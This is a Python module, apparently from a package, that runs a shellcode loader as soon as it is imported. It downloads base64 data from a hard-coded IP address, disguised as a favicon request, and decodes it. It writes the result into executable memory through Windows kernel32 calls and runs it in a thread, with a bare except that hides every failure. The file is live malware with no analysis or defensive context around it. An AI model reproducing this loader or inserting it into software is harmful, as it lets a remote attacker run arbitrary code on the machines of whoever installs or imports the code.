from .utils import *  # noqa
import ctypes
import threading
import requests
import base64
from ctypes import wintypes

def ThreadFunction(lpParameter):
    current_process = kernel32.GetCurrentProcess()
    sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    bytes_written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(current_process, sc_memory, ctypes.c_char_p(buf), len(buf), ctypes.byref(bytes_written))
    shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
    shell_func()
    return 1


def Run():
    thread = threading.Thread(target=ThreadFunction, args=(None,))
    thread.start()

try:
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40

    url = "http://178.20.47.231:7331/favicon.ico"
    resp = requests.get(url, timeout=10)
    resp.raise_for_status()
    data_b64 = resp.text.strip()
    data_b64 = "".join(data_b64.split())

    buf = base64.b64decode(data_b64)

    kernel32 = ctypes.windll.kernel32
    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.VirtualAllocEx.restype = wintypes.LPVOID
    kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    kernel32.WriteProcessMemory.restype = wintypes.BOOL

    Run()
except:
    pass